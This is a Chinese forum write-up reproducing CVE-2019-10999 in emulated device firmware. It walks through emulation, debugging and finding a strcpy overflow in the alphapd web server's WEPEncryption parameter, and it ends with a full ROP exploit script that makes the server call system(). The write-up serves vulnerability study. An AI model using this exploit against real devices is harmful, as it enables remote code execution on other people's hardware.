> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271170.htm)

> [原创]CVE-2019-10999 复现学习

固件仿真
====

`https://github.com/yywz1999/docker-qemu-system`

 

下载好后按照 readme 安装，连接 ssh 上去。

 

然后去打包固件

 

`tar -zcvf cpio.tar.gz cpio-root`

 

上传到 docker

 

切换到 root 权限

 

仿真：

```
mount -o bind /dev/ ./dev/
mount -t proc /proc/ ./proc

```

chroot . ./bin/sh 进入 sh。

 

./etc_ro/rcS 中找到了 internet.sh 文件。查找这个文件它位于： `./sbin/internet.sh`

 

在这个文件中又看到了一个 `[lan.sh](http://lan.sh)` 【./sbin/lan.sh】文件。

 

![](https://bbs.pediy.com/upload/attach/202201/642281_EMPSNQZV3UM65X6.png)

 

继续查看：

 

![](https://bbs.pediy.com/upload/attach/202201/642281_Y49D89B8AVRZCZA.png)

 

发现了关于 web 启动的相关信息。

 

![](https://bbs.pediy.com/upload/attach/202201/642281_PF6ZZEH7BYQ7TVX.png)

 

确定了这个固件启动 web 服务的程序为： `alphapd`

```
killall -q alphapd
sleep 1
alphapd &

```

![](https://bbs.pediy.com/upload/attach/202201/642281_PH9PSFK6VFJGN99.png)

 

无法打开 pid file，创建一个

 

![](https://bbs.pediy.com/upload/attach/202201/642281_FYQFKF9Z2ZGNTDM.png)

 

![](https://bbs.pediy.com/upload/attach/202201/642281_8U4HDT3USMX5NHZ.png)

 

再次报错

 

![](https://bbs.pediy.com/upload/attach/202201/642281_EE4BNDJERZWBV3F.png)

 

![](https://bbs.pediy.com/upload/attach/202201/642281_EM2SF4FUFQ2N7JH.png)

 

创建 nvramd.pid

 

![](https://bbs.pediy.com/upload/attach/202201/642281_N6UMV2BEXERB3XP.png)

 

![](https://bbs.pediy.com/upload/attach/202201/642281_CKTAFY382RBWS5U.png)

```
./gdbserver-mipsel :23946 ./bin/alphapd

```

调试查看 v4 的值

 

可以发现这里是通过 `gpio` 接口来获取 IP 的。但是我们是仿真的，并没有这个接口。所以我们直接去 Patch。

 

![](https://bbs.pediy.com/upload/attach/202201/642281_EB7MUHZNB79ATUG.png)

 

patch 后运行。

 

![](https://bbs.pediy.com/upload/attach/202201/642281_KW8Z34BAGMWAKEG.png)  
![](https://bbs.pediy.com/upload/attach/202201/642281_2CQ4VP8AMF8E7BE.png)

调试
--

```
关闭aslr：echo 0 > /proc/sys/kernel/randomize_va_space
./gdbserver-mipsel :23946 --attach alphapdPID

```

在 gdb-multiarch 中

```
set arch mips
set endian little
target remote 192.168.50.214:40496

```

挖掘漏洞
----

通过对程序分析，寻找敏感函数，最终找到了一个 `strcpy` 用户可控的输入位置

 

![](https://bbs.pediy.com/upload/attach/202201/642281_CF5X7BB7YWBKAH3.png)  
![](https://bbs.pediy.com/upload/attach/202201/642281_3A58VKJ3ZFZUNR6.png)

 

可以看到这里的 `v11` 只有四个字节。 `v8` 是由 `v10` 赋值，而他是从 `WEPEncryption` 获取的。而且并没有长度检查。

 

交叉引用找到调用点

 

![](https://bbs.pediy.com/upload/attach/202201/642281_TP76DN83KHD2HQ2.png)

 

找到了 `formDefineWireless` 函数

 

在 web 页面中找到了相似关键字

 

![](https://bbs.pediy.com/upload/attach/202201/642281_9JMZVPU8MBRCX5X.png)

 

于是测试发包

 

![](https://bbs.pediy.com/upload/attach/202201/642281_Y29WAG7D5ZSBBM8.png)

 

程序 crash，并且控制了 PC 寄存器。

 

于是我们开始测试溢出长度

 

![](https://bbs.pediy.com/upload/attach/202201/642281_HZVZEMV8XESA88K.png)

```
> cyclic -l 0x6161616b
40

```

下面我们就可以来寻找 gadget 打这个溢出。

Libc 基地址
--------

![](https://bbs.pediy.com/upload/attach/202201/642281_NER264XYQBQ7E7P.png)

 

`0x77eda000`

Rop
---

想要打出 system 的话，我们这里就需要来控制 `a0` 寄存器作为函数调用的参数。

 

这是找到的 gadget

```
.text:0004A604                 addiu   $s2, $sp, 0x1E8+var_F8
.text:0004A608                 move    $a0, $s2
.text:0004A60C                 move    $t9, $s0
.text:0004A610                 jalr    $t9 ; sub_49DF0

```

栈中地址存到 `s2` 寄存器中，然后 `s0` 寄存器存入 `t9` 然后调用函数。

 

所以我们的 exp 就可以写了

```
import socket
from pwn import *
context.log_level = 'debug'
context.arch = "mips"
 
Libc_Addr = 0x77eda000
system_Addr = 0x0045080
 
cmd = "echo${IFS}'Pwn!'"
 
gadget = 0x004A608
payload = cyclic(16).upper()
payload += p32(Libc_Addr+system_Addr) # S0
# p -> 0x77F24604
payload += 'BBBB' # S1
payload += p32(0x7fffe2a8) # S2
payload += 'DDDD' # S3
payload += 'EEEE'
payload += 'FFFF'
payload += p32(Libc_Addr+gadget) # PC
payload += 'HHHH'
payload += cmd
 
if __name__ == '__main__':
    #key = "Content-Type:text/html;charset:utf-8\r\n"
    RHOST = '127.0.0.1'
    RPORT = 40080
    request = ""
    request+= "GET /wireless.htm?WEPEncryption={} HTTP/1.1\r\n".format(payload)
    request+= "Host: {}:{}\r\n".format(RHOST,str(RPORT))
    request+= "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
    request+= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    request+= "Accept-Language: en-US,en;q=0.5"
    request+= "Accept-Encoding: gzip, deflate"
    request+= "Connection: close"
    request+= "Upgrade-Insecure-Requests: 1"
    request+= "\r\n\r\n"
 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(request)
    print(request)
    # msg = s.recv(1024)
    s.close()
    # print msg

```

![](https://bbs.pediy.com/upload/attach/202201/642281_MD7UJ4NH8FY9839.png)

[【公告】看雪团队招聘安全工程师，将兴趣和工作融合在一起！看雪 20 年安全圈的口碑，助你快速成长！](https://job.kanxue.com/position-read-1104.htm)

[#固件分析](forum-128-1-170.htm) [#漏洞分析](forum-128-1-171.htm) [#家用设备](forum-128-1-173.htm)